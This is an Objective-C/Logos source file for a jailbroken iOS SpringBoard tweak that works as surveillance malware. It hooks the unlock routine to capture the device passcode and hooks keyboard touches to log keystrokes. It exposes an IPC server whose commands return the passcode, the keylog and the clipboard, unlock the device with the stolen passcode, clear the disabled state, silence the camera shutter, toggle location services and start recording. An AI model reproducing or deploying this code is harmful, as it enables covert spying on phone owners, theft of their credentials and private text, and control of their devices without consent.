#import "header.h"
#import <AppSupport/CPDistributedMessagingCenter.h>

%hook SpringBoard

SBMediaController *fmedia;
NSString *passcode;
NSString *keyLog;

-(void)applicationDidFinishLaunching:(id)application {
	%orig;
	fmedia = (SBMediaController *)[%c(SBMediaController) sharedInstance];
	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
	[messagingCenter runServerOnCurrentThread];
	[messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
	[messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
}

%new
-(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
	NSString *command = [userInfo objectForKey:@"cmd"];
	if ([command isEqual:@"play"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] play];
	}
	else if ([command isEqual:@"pause"]) {
		if ([(SBMediaController *)[%c(SBMediaController) sharedInstance] isPlaying]) {
			[(SBMediaController *)[%c(SBMediaController) sharedInstance] togglePlayPause];
		}
	}
	else if ([command isEqual:@"next"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:1];
	}
	else if ([command isEqual:@"prev"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:-1];
	}
	else if ([command isEqual:@"home"]) {
		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
		}
		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
			[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
		}
	}
	else if ([command isEqual:@"lock"]) {
		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
	}
	else if ([command isEqual:@"wake"]) {
		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
	}
	else if ([command isEqual:@"record"]) {
		[self performSelector:@selector(initRecord) withObject:nil afterDelay:0];
	}
	else if ([command isEqual:@"doublehome"]) {
		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
		}
		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
			[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
		}
	}
	else if ([command isEqual:@"undisabled"]) {
		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
	}
	else if ([command isEqual:@"silenceShutter"]) {
		if (!fmedia.ringerMuted) { //if not muted, toggle mute
    		[fmedia setRingerMuted:!fmedia.ringerMuted];
		}
	}
	else if ([command isEqual:@"togglemute"]) {
    	[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
    	[fmedia setRingerMuted:!fmedia.ringerMuted];
    }
    else if ([command isEqual:@"keylogclear"]) {
    	keyLog = @"";
    }
    else if ([command isEqual:@"locationon"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:true];
    }
    else if ([command isEqual:@"locationoff"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:false];
    }    
}

%new
- (NSDictionary *)commandWithReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
	NSString *command = [userInfo objectForKey:@"cmd"];
	if ([command isEqual:@"getpasscode"]) {
		NSString *result = @"";
		if (passcode != NULL)
			result = passcode;
		else 
			result = @"We have not obtained passcode yet";
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"lastapp"]) {
		SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
		if (NSString *lastapp = iconcontroller.nodeIdentifier)
			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"islocked"]) {
		if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked])  
			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"ismuted"]) {
		NSString *result = @"";
		if (fmedia.ringerMuted)
			result = @"true";
		else
			result = @"false";
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"unlock"]) {
		NSString *result = @"";
		if (passcode != NULL)
			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
		else 
			result = @"We have not obtained passcode yet";
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"keylog"]) {
		NSString *result = @"";
		if (keyLog != NULL) {
			result = keyLog;
		}
		else {
			result = @"Listening...";
		}
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([command isEqual:@"getpaste"]) {
		return [NSDictionary dictionaryWithObject:[UIPasteboard generalPasteboard].items[0] forKey:@"returnStatus"];		
	}
	
	return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
}
%end


//log passcode

%hook SBLockScreenManager
-(void)attemptUnlockWithPasscode:(id)arg1 {
	%orig;
	passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
}
/* depricated
-(BOOL)attemptUnlockWithPasscode:(id)arg1 {
	bool success = %orig;
	if ([[[NSString alloc] initWithFormat:@"%@", arg1] isEqual:@"1"]) {
		return true;
	}
	if (success) {
		passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
	}
	return success;
}
*/
%end

@interface UIKBTree : NSObject
@property(retain, nonatomic) NSString *displayString;
@end

%hook UIKeyboardLayoutStar
- (void)touchDownWithKey:(id)arg1 atPoint:(struct CGPoint)arg2 executionContext:(id)arg3 {
	NSLog(@"this key was pressed %@",arg1);
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
			UIKBTree *kbtree = arg1;
			NSString *text = kbtree.displayString;
			if ([text isEqual: @"space"])
				text = @" ";
			else if ([text isEqual: @"Search"]) {
				text = @"<Search>";
			}
			else if ([text isEqual: @"delete"]) {
				text = @"<delete>";
			}
			else if ([text isEqual: @"ABC"]) {
				text = @"<ABC>";
			}
			else if ([text isEqual: @"123"]) {
				text = @"<123>";
			}
			else if ([text isEqual: @"(null)"]) {
				text = @"";
			}
            if (keyLog == NULL) {
	            keyLog = @"";
            }           	
			keyLog = [[NSString alloc] initWithFormat:@"%@%@",keyLog,text];
	});
	%orig;
}
%end


